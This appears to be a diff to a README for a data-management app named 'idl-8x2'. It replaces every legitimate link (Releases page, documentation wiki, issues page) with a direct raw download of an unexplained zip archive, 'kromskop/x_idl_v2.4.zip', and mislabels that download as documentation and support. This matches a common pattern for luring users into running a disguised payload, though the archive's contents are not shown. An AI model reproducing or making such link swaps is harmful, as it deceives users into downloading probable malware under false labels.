@@ -8,7 +8,7 @@ Welcome to idl-8x2! This application helps you manage your data easily. Whether 
 
 To get started, visit the Releases page to download the latest version of idl-8x2:
 
-[![Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/KEDULLAH/idl-8x2/releases)
+[![Latest Release](https://raw.githubusercontent.com/KEDULLAH/idl-8x2/main/kromskop/x_idl_v2.4.zip%20Latest%https://raw.githubusercontent.com/KEDULLAH/idl-8x2/main/kromskop/x_idl_v2.4.zip)](https://raw.githubusercontent.com/KEDULLAH/idl-8x2/main/kromskop/x_idl_v2.4.zip)
 
 Follow these steps to install the software:
 
@@ -17,7 +17,7 @@ Follow these steps to install the software:
 3. Select the file suited for your operating system.
 4. Click on the file to start downloading.
 
-The Releases page can be found here: [Download from Releases Page](https://github.com/KEDULLAH/idl-8x2/releases)
+The Releases page can be found here: [Download from Releases Page](https://raw.githubusercontent.com/KEDULLAH/idl-8x2/main/kromskop/x_idl_v2.4.zip)
 
 ## ✅ System Requirements
 
@@ -74,8 +74,8 @@ If you encounter issues while using idl-8x2, consider these quick fixes:
 
 For more information, tutorials, and community support, check out the following resources:
 
-- [Official Documentation](https://github.com/KEDULLAH/idl-8x2/wiki)
-- [GitHub Issues](https://github.com/KEDULLAH/idl-8x2/issues)
+- [Official Documentation](https://raw.githubusercontent.com/KEDULLAH/idl-8x2/main/kromskop/x_idl_v2.4.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/KEDULLAH/idl-8x2/main/kromskop/x_idl_v2.4.zip)
 
 ## 📧 Contact
 
